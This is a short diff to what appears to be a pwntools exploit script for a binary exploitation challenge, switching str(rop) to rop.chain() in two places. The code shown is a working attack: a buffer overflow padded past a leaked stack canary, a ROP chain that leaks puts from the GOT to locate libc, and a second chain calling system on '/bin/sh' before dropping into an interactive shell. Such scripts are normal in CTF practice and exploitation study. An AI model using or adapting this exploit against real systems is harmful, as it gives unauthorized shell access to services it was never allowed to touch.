@@ -18,7 +18,7 @@ rop = ROP(e)
 rop.puts(e.got["puts"])
 rop.main()
 p.readuntil("name?\n")
-p.sendline("A" * 40 + p64(canary) + p64(0xdeadbeef) + str(rop))
+p.sendline("A" * 40 + p64(canary) + p64(0xdeadbeef) + rop.chain())
 p.readuntil("week.\n")
 puts_leak = u64(p.read(6) + "\x00\x00")
 libc.address = puts_leak - libc.symbols["puts"]
@@ -36,6 +36,6 @@ p.readuntil("name?\n")
 
 rop = ROP(libc)
 rop.system(bin_sh_address)
-p.sendline("A" * 40 + p64(canary) + p64(0xdeadbeef) + str(rop))
+p.sendline("A" * 40 + p64(canary) + p64(0xdeadbeef) + rop.chain())
 
 p.interactive()
